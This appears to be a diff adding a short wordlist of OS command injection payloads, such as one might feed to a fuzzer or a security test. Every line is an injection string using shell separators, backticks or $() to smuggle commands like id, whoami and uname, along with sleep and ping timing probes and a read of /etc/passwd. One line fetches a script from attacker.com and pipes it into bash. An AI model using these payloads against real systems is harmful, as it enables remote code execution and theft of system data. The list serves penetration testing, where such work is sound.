@@ -1,0 +1,10 @@
+; id;
+| whoami
+`id`
+$(id)
+; curl http://attacker.com/shell.sh | bash
+& id &
+; sleep 10;
+| ping -c 10 127.0.0.1
+; uname -a;
+; cat /etc/passwd;
